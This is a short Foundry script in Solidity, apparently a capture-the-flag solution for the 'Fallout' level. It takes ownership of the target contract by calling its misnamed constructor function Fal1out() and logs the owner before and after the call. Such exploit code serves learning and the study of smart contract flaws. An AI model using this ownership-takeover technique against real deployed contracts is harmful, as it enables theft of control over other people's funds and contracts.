// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/level02.sol";

contract POC is Script {
    Fallout level02 = Fallout(payable(vm.envAddress("INSTANCE")));

    function run() external {
        vm.startBroadcast();

        console.log("Current Owner is: ", level02.owner());
        
        level02.Fal1out();

        console.log("New Owner is: ", level02.owner());

        vm.stopBroadcast();
    }
}
